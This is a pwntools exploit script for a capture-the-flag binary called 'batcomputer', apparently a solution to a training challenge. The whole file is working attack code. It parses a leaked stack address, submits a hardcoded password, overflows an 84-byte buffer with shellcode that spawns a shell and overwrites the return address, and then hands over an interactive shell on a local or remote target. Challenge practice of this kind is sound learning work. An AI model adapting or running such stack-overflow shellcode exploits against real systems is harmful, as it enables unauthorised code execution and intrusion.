#!/usr/bin/python3

from pwn import *

elf = None

def start():

    filename = './batcomputer'
    elf = context.binary = filename
    # context.log_level = 'debug'

    if len(sys.argv) > 1:
        if sys.argv[1] == 'gdb':
            gdbscript = '''
            init-pwnidbg
            continue
            '''
            return gdb.debug(filename, gdbscript=gdbscript)
        elif  sys.argv[1] == 'remote':
            host, port = sys.argv[2:]
            return remote(host, int(port))
    else:
        return process(filename)


def runmain():

    io = start()

    io.sendlineafter('>', b'1')

    data = io.recvline().strip().split()[-1][2:]
    data = bytearray(binascii.unhexlify(data)).rjust(8, b'\x00')
    jump_address = u64(data, endian='big')

    io.sendlineafter('>', b'2')

    batpassword =  b'b4tp@$$w0rd!'
    
    print(f'the batpassword is: {batpassword.decode()}')
    io.sendlineafter('password:', batpassword)

    # shellcode = asm(shellcraft.cat('flag.txt'))
    # shellcode = open('payload', 'rb').read()
    shellcode = asm(shellcraft.popad() + shellcraft.sh())
    assert len(shellcode) <= 84

    payload = shellcode + b'a' * (84 - len(shellcode)) + p64(jump_address)
    # payload = shellcode + b'a' * (84 - len(shellcode)) + b'b' * 8
    # payload = b'a' * 84 + p64(jump_address)
    info(f'the jump address is: {p64(jump_address)}')
    info(f'the jump address in hex: {hex(jump_address)}')

    io.sendafter('commands:', payload)
    input('IDA>')

    io.sendlineafter('>', b'3')

    io.interactive()


if __name__ == '__main__':
    runmain()
